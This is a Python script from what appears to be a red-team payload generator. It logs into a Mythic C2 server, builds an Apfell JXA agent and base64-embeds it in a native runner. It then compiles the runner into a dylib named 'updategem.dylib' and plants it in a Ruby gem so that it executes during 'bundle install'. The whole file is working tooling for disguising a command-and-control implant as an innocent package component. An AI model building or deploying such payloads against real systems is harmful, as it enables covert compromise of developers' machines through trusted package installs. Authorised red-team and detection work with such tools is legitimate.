import os, base64
import asyncio
from .Utilities import *

def ruby_gem_dylib():
    temp = "./Templates/Ruby_Gem_Dylib/"
    payload = "./Payloads/Ruby_Gem_Dylib_Payload/"

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Ruby Gem Dylib",
                                           filename="Ruby_Gem_Dylib.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":

            print("[*] Building Ruby Gem")
            #Download Payload
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/Ruby_Gem_Dylib.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)  # write out to disk

            #Modify the runner
            templateString = "BASE64 ENCODED APFELL PAYLOAD HERE"
            fin = open(payload + "Ruby_Gem_Dylib.js", "rt")
            orgPayload = fin.read()
            fin.close()

            #base64 Payload
            message_bytes = orgPayload.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')


            fin = open("./Payloads/Ruby_Gem_Dylib_Payload/JXADylib_Runner/JSRunner.mm", "rt")
            data = fin.read()
            data = data.replace(templateString, base64_message)
            fin.close()

            fin = open("./Payloads/Ruby_Gem_Dylib_Payload/JXADylib_Runner/JSRunner.mm", "wt")
            fin.write(data)
            fin.close()

            os.system("g++ -dynamiclib -o /private/tmp/updategem.dylib -framework Foundation -framework OSAKit ./Payloads/Ruby_Gem_Dylib_Payload/JXADylib_Runner/plugin.cpp ./Payloads/Ruby_Gem_Dylib_Payload/JXADylib_Runner/jsrunner.mm")
            os.system("mv /private/tmp/updategem.dylib ./Payloads/Ruby_Gem_Dylib_Payload/Gem_Files/lib/gem/loader/updategem.dylib")
            #os.system("chmod +x " + modifyFile)
            print("[*] Done! Execute using Ruby 'bundle install' within 'Gem_Files' folder")
        else:
            print(f"[-] Failed to build payload:  {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
